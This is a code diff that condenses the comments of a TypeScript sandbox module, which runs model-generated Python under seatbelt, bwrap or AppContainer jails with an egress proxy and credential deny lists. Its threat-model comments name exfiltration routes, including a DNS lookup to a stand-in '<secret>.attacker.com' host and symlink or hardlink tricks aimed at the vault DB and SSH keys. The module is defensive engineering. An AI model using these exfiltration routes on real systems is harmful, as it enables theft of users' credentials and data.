@@ -12,40 +12,29 @@ import { ambientSecretDirs, ambientSecretFiles } from "../security/ambientSecret
 import { devOnly } from "../security/devOnly";
 
 /**
- * Run model-generated Python in a jailed child process. The code can NOT write the
- * user's real files (writes confined to a per-run scratch dir) and its network is
- * forced through the loopback egress proxy, which allow-lists only {@link ALLOW_HOSTS}.
+ * Run model-generated Python in a jailed child process: writes confined to a per-run
+ * scratch dir, network forced through the loopback egress proxy ({@link ALLOW_HOSTS}).
  *
- * ⚠️ Threat model (audit): the child runs DE-REDACTED code — the caller
- * (`mcpAgent` `p.fromWire`) restores the real values before execution so deliverables
- * hold the user's real data. So the sandbox DOES process real PII; egress + FS
- * confinement are LOAD-BEARING, not defence-in-depth. (The compensating control is
- * on the MODEL-facing side: run_python stdout is re-redacted before the model sees
- * it — that half is sound; the gap the jail must close is exfiltration.)
+ * ⚠️ Threat model: the child runs DE-REDACTED code (the caller restores real values so
+ * deliverables hold the user's real data). Egress + FS confinement are LOAD-BEARING, not
+ * defence-in-depth: stdout is re-redacted before the model sees it, so the gap the jail
+ * must close is exfiltration.
  */
 
 const MAX_OUT = 200_000; // cap stdout/stderr chars
-// Resource caps enforced on the sandboxed child via a `ulimit` wrapper (below), so a
-// hostile/hallucinated snippet can't OOM or spin the machine even before the wall-clock
-// timeout fires. ADDRESS-SPACE cap (`ulimit -v`, KB): honoured on Linux; best-effort on
-// macOS (the kernel largely ignores -v, but it's harmless there). CPU-seconds cap is a
-// hard backstop derived from the wall timeout.
+// Address-space cap (`ulimit -v`, KB): honoured on Linux, best-effort on macOS.
 const MAX_ADDRESS_SPACE_KB = 4 * 1024 * 1024; // 4 GB
 /** Whether the sandbox child gets NO network at all.
- *  - `OPENMASQ_SANDBOX_NO_NET=1` forces it everywhere (max hardening).
- *  - Linux: NO network by DEFAULT (audit C-2). `--share-net` puts the child back in
- *    the host netns where egress is only enforced by cooperative HTTPS_PROXY env vars,
- *    which a raw `socket.connect()` bypasses — so on Linux the "market-data only" claim
- *    is unenforceable. Opt back in with `OPENMASQ_SANDBOX_LINUX_NET=1` (accepting that
- *    egress is not netns-restricted).
- *  macOS keeps network on: the seatbelt profile HARD-restricts outbound to the loopback
- *  proxy port at the kernel level, so egress really is market-data only.
- *  TODO(security) C-2: netns egress filtering (pasta/nftables) → then default Linux net on. */
+ *  - `OPENMASQ_SANDBOX_NO_NET=1` forces it everywhere.
+ *  - Linux: NO network by DEFAULT. `--share-net` leaves egress enforced only by cooperative
+ *    proxy env vars, which a raw `socket.connect()` bypasses. `OPENMASQ_SANDBOX_LINUX_NET=1`
+ *    opts back in, accepting that. Netns egress filtering is the follow-up.
+ *  macOS keeps network on: the seatbelt profile restricts outbound to the proxy port at the
+ *  kernel level. */
 const noNetwork = (): boolean => {
   if (process.env.OPENMASQ_SANDBOX_NO_NET === "1") return true;
   if (process.platform === "linux" && devOnly(process.env.OPENMASQ_SANDBOX_LINUX_NET) !== "1") return true;
-  // win32: ALWAYS, and not as a policy choice — see `winJail.ts` (an AppContainer with no
-  // capability has no socket at all, so there is nothing an env var could re-open).
+  // win32: an AppContainer with no capability has no socket at all (`winJail.ts`).
   if (process.platform === "win32") return true;
   return false;
 };
@@ -100,24 +89,11 @@ export function jailAvailability(): Jail {
   return "none";
 }
 
-/** The at-rest secret files/dirs the sandbox child must NOT read. `file-read*` is broad
- *  (python needs stdlib/dylibs), so the crown-jewels are DENY-listed explicitly. Two
- *  tiers:
- *   • the app's OWN userData secrets — the conversation vault DB (placeholder→real for
- *     EVERY conversation), the encrypted key material, the MCP token store (audit H-10);
- *   • the USER's ambient credentials elsewhere on disk (audit H-3): the de-redacted,
- *     possibly injection-steered code could otherwise `open("~/.ssh/id_rsa")`, cloud/CLI
- *     tokens, browser cookie stores, keychains — content the model has no business
- *     reading and which is NOT covered by the vault re-redaction (only KNOWN PII is
- *     re-masked in stdout, so novel secret bytes would reach the external model). We
- *     leave the rest of `/` readable (python needs the runtime + system libs) but mask
- *     these high-value credential locations. NOT a full minimal-allow-list jail — that
- *     remains the follow-up — but it neutralises the concrete exfil paths. */
 /**
  * The dirs UNDER userData the jailed run legitimately needs (read + write): the Python
- * runtime (dev downloads the interpreter here; the per-run scratch lives under it) and the
- * persistent matplotlib cache. Everything ELSE under userData is a secret (see {@link
- * secretPaths}) — these are carved BACK IN after the blanket userData deny.
+ * runtime (the per-run scratch lives under it) and the persistent matplotlib cache.
+ * Everything ELSE under userData is a secret ({@link secretPaths}); these are carved BACK
+ * IN after the blanket deny.
  */
 export function sandboxReadCarveOuts(): string[] {
   const u = app.getPath("userData");
@@ -127,22 +103,19 @@ export function sandboxReadCarveOuts(): string[] {
 export function secretPaths(): { dirs: string[]; files: string[] } {
   const u = app.getPath("userData");
   return {
-    // Audit M7: deny the WHOLE userData subtree (parity with the FS-MCP `fsDenyPaths`),
-    // not just `accounts/` — it also holds `broker/` (CDP secret), `agent-browser/` (the
-    // authenticated-SaaS cookies), `files/` (saved file blobs, plaintext in dev/no-keyring),
-    // `mcp.json`, and every `*.enc`. A blanket deny also covers any FUTURE secret added
-    // here. The runtime/scratch/mpl-cache are carved back in ({@link sandboxReadCarveOuts}).
-    // The user's AMBIENT credential stores (audit H-3) are the SHARED set the FS-MCP gate
-    // masks too — one source (`security/ambientSecrets.ts`, root rule 9) so the two can't drift.
+    // The WHOLE userData subtree is denied (vault DB, key material, token store, browser
+    // cookies, saved blobs, and any FUTURE secret); the runtime/scratch/mpl-cache are carved
+    // back in ({@link sandboxReadCarveOuts}). The user's AMBIENT credential stores are the
+    // set the FS gate masks too, from the one source `security/ambientSecrets.ts`: only
+    // KNOWN PII is re-masked in stdout, so a novel secret read here would reach the model.
     dirs: [u, ...ambientSecretDirs()],
     files: ambientSecretFiles(),
   };
 }
 
-/** macOS seatbelt profile: read broadly (python needs stdlib/dylibs) EXCEPT the userData
- *  secrets (audit H-10), write ONLY the per-run scratch + the (writable, userData)
- *  matplotlib cache — the Python RUNTIME is NOT writable — and allow network ONLY to the
- *  loopback egress proxy (or nothing at all under {@link noNetwork}). */
+/** macOS seatbelt profile: read broadly (python needs stdlib/dylibs) EXCEPT the secrets,
+ *  write ONLY the per-run scratch + the matplotlib cache (the RUNTIME is not writable),
+ *  network ONLY to the loopback egress proxy (or nothing under {@link noNetwork}). */
 export function seatbeltProfile(scratch: string, proxyPort: number): string {
   const secrets = secretPaths();
   return [
@@ -151,31 +124,22 @@ export function seatbeltProfile(scratch: string, proxyPort: number): string {
     "(allow process-fork)",
     "(allow process-exec*)",
     "(allow file-read*)",
-    // Later rules win in SBPL → carve the secret vault/keys/tokens back out of the
-    // broad read-allow so de-redacted code can't slurp them (audit H-10 / M7). The whole
-    // userData is now denied, so RE-ALLOW read of the runtime + scratch + mpl-cache that
-    // live under it (later rule wins), else the interpreter itself becomes unreadable.
+    // Later rules win in SBPL: deny the secrets out of the broad read-allow, then re-allow
+    // the runtime + scratch + mpl-cache that live under userData.
     ...secrets.dirs.map((d) => `(deny file-read* (subpath "${d}"))`),
     ...secrets.files.map((f) => `(deny file-read* (literal "${f}"))`),
     ...sandboxReadCarveOuts().map((d) => `(allow file-read* (subpath "${d}"))`),
-    // The userData DIRECTORY NODE itself sits inside the blanket `subpath` deny, and the
-    // carve-outs above only re-open what's strictly BELOW `userData/python`. SQLite's
-    // `unixFullPathname` lstat()s EVERY component of a DB path — it hits the userData
-    // node → EPERM → SQLITE_CANTOPEN ("unable to open database file") for ANY file DB in
-    // the scratch, which silently broke every yfinance fetch (its cookie/tz cache is
-    // SQLite). Re-allow METADATA of that one node, `literal` on purpose: stat/lstat of
-    // the folder itself (dates/perms), zero read access to anything inside it — the
-    // children stay under the deny. Pinned in `sandbox.test.ts`.
+    // SQLite lstat()s EVERY component of a DB path, including the userData node itself:
+    // re-allow METADATA of that one node (`literal`: the folder's stat only, zero read
+    // access inside it). Pinned in `sandbox.test.ts`.
     `(allow file-read-metadata (literal "${app.getPath("userData")}"))`,
     `(allow file-write* (subpath "${scratch}") (subpath "${mplConfigDir()}"))`,
     "(allow file-write-data (subpath \"/dev\"))",
     // Egress: ONLY the loopback proxy port, or — in max-hardening mode — nothing.
     ...(noNetwork() ? [] : [`(allow network-outbound (remote ip "localhost:${proxyPort}"))`]),
     "(allow mach-lookup)",
-    // …but NOT the DNS resolver: `mach-lookup` to mDNSResponder is an off-box DNS
-    // exfiltration channel (`getaddrinfo("<secret>.attacker.com")`) that the
-    // network-outbound rule can't see. The child needs no DNS — the egress proxy
-    // resolves the allow-listed host itself (audit M-6).
+    // …but NOT the DNS resolver: `getaddrinfo("<secret>.attacker.com")` is an exfil channel
+    // the network-outbound rule can't see. The egress proxy resolves the host itself.
     '(deny mach-lookup (global-name "com.apple.mDNSResponder"))',
     '(deny mach-lookup (global-name "com.apple.mDNSResponderHelper"))',
     '(deny mach-lookup (global-name "com.apple.dnssd.service"))',
@@ -184,11 +148,8 @@ export function seatbeltProfile(scratch: string, proxyPort: number): string {
   ].join("\n");
 }
 
-/** Every temp-dir env a jailed run needs pointed INSIDE the scratch: the jail denies
- *  /tmp|/var/tmp|/usr/tmp|the darwin per-user temp, so anything probing a temp dir —
- *  SQLite's journal/temp store (even for `:memory:`), Python `tempfile`, requests_cache —
- *  fails without these. `SQLITE_TMPDIR` is read by SQLite's unix VFS ahead of `TMPDIR`.
- *  Must be set at SPAWN: SQLite resolves it from the process's starting environment. */
+/** Every temp-dir env a jailed run needs, pointed INSIDE the scratch: the jail denies the
+ *  system temp dirs. `SQLITE_TMPDIR` is read ahead of `TMPDIR`; set at SPAWN. */
 export function sandboxTempEnv(tmpDir: string): Record<string, string> {
   return { TMPDIR: tmpDir, TMP: tmpDir, TEMP: tmpDir, SQLITE_TMPDIR: tmpDir };
 }
@@ -211,32 +172,22 @@ export function jailedCmd(
       cmd: "bwrap",
       args: [
         "--ro-bind", "/", "/", // whole FS READ-ONLY → the Python runtime can't be mutated
-        // Mask every deny-listed secret (audit H-10 + H-3): an empty tmpfs over each
-        // secret DIR that exists (the app's accounts/ vault DBs + token store, and the
-        // user's ~/.ssh /.aws /.gnupg / cloud-CLI / browser-profile credential dirs) and
-        // /dev/null over each secret FILE that exists (*.enc keys, .netrc/.npmrc/.pypirc/
-        // .git-credentials, shell histories). Only existing paths are masked (bwrap errors
-        // on a missing bind target).
+        // Mask every secret: an empty tmpfs over each DIR, /dev/null over each FILE. Only
+        // existing paths (bwrap errors on a missing bind target).
         ...secrets.dirs.filter((d) => existsSync(d)).flatMap((d) => ["--tmpfs", d]),
         ...secrets.files.filter((f) => existsSync(f)).flatMap((f) => ["--ro-bind", "/dev/null", f]),
-        // userData is now blanket-masked (audit M7) → re-expose ONLY the runtime + mpl-cache
-        // that live under it (later binds layer over the tmpfs), else python can't run / plot.
+        // Re-expose ONLY the runtime + mpl-cache under the masked userData (later binds
+        // layer over the tmpfs).
         ...sandboxReadCarveOuts().filter((d) => existsSync(d)).flatMap((d) => ["--ro-bind", d, d]),
-        // TODO(security): tighten `--ro-bind / /` to a minimal path set (bind only the
-        // runtime + system libs, leave $HOME/userData unmounted) rather than mask-listing.
+        // Follow-up: a minimal bind set instead of mask-listing over `--ro-bind / /`.
         "--bind", scratch, scratch,
-        // The persistent matplotlib cache lives in (writable) userData, OUTSIDE the
-        // read-only-bound tree; bind it rw so a run can refresh/build fontlist-*.json.
-        // Normally pre-warmed at install → runs only READ it.
+        // The persistent matplotlib cache, rw so a run can refresh fontlist-*.json.
         "--bind", mplConfigDir(), mplConfigDir(),
         "--dev", "/dev",
         "--proc", "/proc",
         "--unshare-all", // new user/ipc/pid/uts/cgroup/net namespaces…
-        // …then RE-share net ONLY when egress is allowed, so the loopback proxy is
-        // reachable; under max-hardening (noNetwork) the child has NO network at all.
-        // NOTE: `--share-net` gives full outbound (egress is proxy-enforced via HTTPS_PROXY
-        // + no other route on macOS seatbelt); per-host netns filtering (pasta/nftables) is
-        // a documented follow-up — the correct, always-working hard mode here is no-net.
+        // …then RE-share net ONLY when egress is allowed (see `noNetwork`: `--share-net`
+        // gives full outbound).
         ...(noNetwork() ? [] : ["--share-net"]),
         "--cap-drop", "ALL", // drop every capability inside the sandbox
         "--new-session", // detach controlling TTY (blocks TIOCSTI terminal injection)
@@ -245,46 +196,36 @@ export function jailedCmd(
       ],
     };
   }
-  // The memory ceiling is the SAME number the POSIX cage uses — one source, two shapes
-  // (`ulimit -v` in KB there, a Job Object limit in MB here).
+  // The SAME memory ceiling as the POSIX cage (`ulimit -v` in KB there, a Job Object in MB).
   if (jail === "appcontainer") {
     return winJailCmd(pythonBin, mainPy, scratch, Math.floor(MAX_ADDRESS_SPACE_KB / 1024));
   }
   return { cmd: pythonBin, args: [mainPy] }; // no jail: refused upstream by runPython
 }
 
-/** Wrap a command in a POSIX `ulimit` cage: a CPU-seconds cap (hard backstop past the
- *  wall-clock timeout) + an address-space cap, so a runaway/hostile snippet can't peg the
- *  CPU or exhaust memory. Uses `exec "$@"` so no extra process lingers. No-op on win32 —
- *  not a gap: the Windows jail launcher applies the same caps through a Job Object (`winJail.ts`). */
+/** POSIX `ulimit` cage: CPU-seconds (backstop past the wall timeout) + address space.
+ *  `exec "$@"` so no extra process lingers. No-op on win32: the jail launcher applies the
+ *  same caps through a Job Object (`winJail.ts`). */
 function withRlimits(cmd: string, args: string[], cpuSecs: number): { cmd: string; args: string[] } {
   if (process.platform === "win32") return { cmd, args };
-  // Process-count cap (audit M9): bounds a fork-bomb. RLIMIT_NPROC is per-real-UID, so a
-  // low cap is UNSAFE on macOS (it counts ALL the user's processes → could starve the run
-  // if the user already has many). Under bwrap's `--unshare-all` the child gets a NEW user
-  // namespace, so the count is isolated to the sandbox → a cap is both safe and effective
-  // there. Apply it on Linux only; macOS relies on the OS-default per-UID ceiling + the 60s
-  // wall-clock SIGKILL of the whole tree.
+  // Process-count cap (bounds a fork-bomb) on Linux only: RLIMIT_NPROC is per-real-UID,
+  // so it is only safe inside bwrap's new user namespace; macOS relies on the wall-clock
+  // SIGKILL of the whole tree.
   const nproc = process.platform === "linux" ? " ulimit -u 256 2>/dev/null;" : "";
   const script = `ulimit -t ${cpuSecs} 2>/dev/null;${nproc} ulimit -v ${MAX_ADDRESS_SPACE_KB} 2>/dev/null; exec "$@"`;
   return { cmd: "/bin/sh", args: ["-c", script, "sh", cmd, ...args] };
 }
 
-/** Read a COLLECTED deliverable/figure file safely (audit M3). The collectors run in
- *  the UNJAILED main process, so a symlink the jailed child dropped in the output dir
- *  (`out/x.pdf` → `…/accounts/openmasq-<uid>.db`, or `~/.ssh/id_rsa`) would be FOLLOWED and
- *  the secret handed back as a "deliverable", defeating the seatbelt/bwrap read-deny. Reject
- *  anything that isn't a real REGULAR file (lstat, so a symlink is not dereferenced for the
- *  type test) and any name with a path separator (readdir yields basenames, but defence). */
+/** Read a COLLECTED deliverable/figure safely. The collectors run in the UNJAILED main
+ *  process, so a symlink the child dropped in the output dir would be FOLLOWED and a secret
+ *  handed back as a "deliverable". lstat, regular files only, no path separator. */
 async function readCollected(dir: string, name: string, maxBytes: number): Promise<Buffer | null> {
   if (name.includes("/") || name.includes("\\") || name.includes("\0")) return null;
   const full = join(dir, name);
   try {
     const st = await lstat(full);
-    // symlink/dir/fifo, too big, OR a HARDLINK (nlink>1, audit M3 residual): a jailed child
-    // can create `out/x.pdf` as a hardlink to `accounts/vault.db` — lstat sees a regular
-    // file, but nlink>1 reveals it aliases another path (a real deliverable it just wrote
-    // has nlink 1). Refuse it so the unjailed collector can't hand back a secret.
+    // Also refuse a HARDLINK (nlink>1): lstat sees a regular file, but it aliases another
+    // path; a real deliverable just written has nlink 1.
     if (!st.isFile() || st.size > maxBytes || st.nlink > 1) return null;
     return await readFile(full);
   } catch {
@@ -297,10 +238,8 @@ function killTree(child: ChildProcess): void {
     if (process.platform === "win32" && child.pid) {
       spawnSync("taskkill", ["/pid", String(child.pid), "/T", "/F"], { stdio: "ignore" });
     } else if (child.pid) {
-      // Kill the whole PROCESS GROUP (audit M9): the child is spawned `detached` (own pgid),
-      // so `-pid` reaches python's forked grandchildren too — on macOS (no PID namespace) a
-      // fork-bomb / backgrounded child otherwise orphans and survives the wall-clock kill.
-      // Fall back to killing just the child if the group signal fails (already gone / no pgid).
+      // Kill the whole PROCESS GROUP (the child is spawned `detached`), so forked
+      // grandchildren don't survive the wall-clock kill.
       try {
         process.kill(-child.pid, "SIGKILL");
       } catch {
@@ -401,11 +340,8 @@ export async function runPython(
     seedFiles?: SeedFile[];
   },
 ): Promise<PythonResult> {
-  // HARD GATE (audit C-1): never run model-generated, DE-REDACTED code with NO jail.
-  // `jailAvailability()` is "none" on Linux without bwrap, and on Windows when
-  // the jail launcher is missing from the bundle — running bare there would give untrusted
-  // code the user's real data + full FS/network with their own privileges. Refuse unless
-  // the user explicitly accepts the risk with OPENMASQ_PYTHON_UNSAFE=1.
+  // HARD GATE: never run DE-REDACTED code with NO jail. Refuse unless the user explicitly
+  // accepts the risk with OPENMASQ_PYTHON_UNSAFE=1.
   if (jailAvailability() === "none" && devOnly(process.env.OPENMASQ_PYTHON_UNSAFE) !== "1") {
     return {
       ok: false,
@@ -420,29 +356,19 @@ export async function runPython(
   }
   const scratch = join(app.getPath("userData"), "python", "runs", randomUUID());
   const figDir = join(scratch, "figures");
-  // A DEDICATED, clean output dir = the child's CWD, so a file the model saves with a
-  // relative name (`pdf.output("rapport.pdf")`) lands here and is captured — without
+  // A DEDICATED, clean output dir = the child's CWD, so a relative save lands here without
   // sweeping up scaffolding (main.py).
   const outDir = join(scratch, "out");
-  // A WRITABLE temp dir INSIDE the jail. The seatbelt/bwrap jail denies /tmp, /var/tmp,
-  // /usr/tmp AND the macOS per-user darwin temp (`/var/folders/…/T`), and TMPDIR is unset
-  // — so anything probing the temp dir (SQLite's journal/temp store, tempfile.mkdtemp,
-  // requests_cache) fails. SQLite is the sharp edge: yfinance opens a SQLite cookie/tz/ISIN
-  // cache and, with no reachable temp dir, EVERY fetch dies with "unable to open database
-  // file" → an empty DataFrame for every ticker (the reported "yfinance ne renvoie rien").
-  // A scratch-local temp dir is already jail-writable (it's under `scratch`), so pointing
-  // the temp-dir envs here fixes it with ZERO widening of the jail. Verified end-to-end in
-  // `sandbox.test.ts` (a real SQLite open succeeds).
+  // A WRITABLE temp dir INSIDE the jail (the system temp dirs are denied; SQLite needs
+  // one even for `:memory:`). Under `scratch`, so ZERO widening of the jail.
   const tmpDir = join(scratch, "tmp");
-  // PERSISTENT matplotlib cache — NOT in scratch (which is wiped each run), so the font
-  // cache is built once (pre-warmed at install) and reused, never rebuilt per run.
+  // PERSISTENT matplotlib cache, outside the wiped scratch.
   const mplDir = mplConfigDir();
   await mkdir(figDir, { recursive: true });
   await mkdir(outDir, { recursive: true });
   await mkdir(tmpDir, { recursive: true });
   await mkdir(mplDir, { recursive: true });
-  // Seed prior deliverables into the CWD (sanitized in MAIN, never trusted from the
-  // renderer) and remember each seed's hash: an unchanged seed is NOT re-collected.
+  // Seed prior deliverables (sanitized in MAIN); an unchanged seed is NOT re-collected.
   const seeded = new Map<string, string>();
   for (const f of sanitizeSeedFiles(opts.seedFiles)) {
     await writeFile(join(outDir, f.name), f.bytes);
@@ -454,8 +380,7 @@ export async function runPython(
   const proxy = await startEgressProxy(ALLOW_HOSTS);
   const proxyUrl = `http://127.0.0.1:${proxy.port}`;
   const timeoutMs = opts.timeoutMs ?? 60_000;
-  // CPU-seconds backstop = the wall timeout + a margin (multi-core work can burn CPU
-  // faster than wall time; the setTimeout below is the primary kill).
+  // CPU-seconds backstop = the wall timeout + a margin (multi-core work burns faster).
   const cpuSecs = Math.ceil(timeoutMs / 1000) + 30;
   const jailed = jailedCmd(opts.pythonBin, mainPy, scratch, proxy.port);
   const { cmd, args } = withRlimits(jailed.cmd, jailed.args, cpuSecs);
@@ -473,10 +398,8 @@ export async function runPython(
     HTTP_PROXY: proxyUrl,
     https_proxy: proxyUrl,
     http_proxy: proxyUrl,
-    // yfinance 0.2.65 uses curl_cffi (libcurl). libcurl honours https_proxy but some
-    // paths only consult ALL_PROXY/all_proxy — set both so EVERY client (requests +
-    // curl_cffi) routes through the loopback egress proxy (the jail blocks any socket
-    // that doesn't, so a missed proxy env = a silent connection failure = zero data).
+    // libcurl paths may consult only ALL_PROXY: every client must route through the
+    // proxy (the jail blocks any socket that doesn't).
     ALL_PROXY: proxyUrl,
     all_proxy: proxyUrl,
     NO_PROXY: "",
@@ -486,8 +409,7 @@ export async function runPython(
     let stdout = "";
     let stderr = "";
     let timedOut = false;
-    // `detached` on posix → the child leads its OWN process group, so `killTree` can
-    // SIGKILL the whole group (`-pid`) incl. forked grandchildren on the timeout (audit M9).
+    // `detached` on posix → own process group, so `killTree` reaches forked grandchildren.
     const child = spawn(cmd, args, {
       cwd: outDir,
       env,
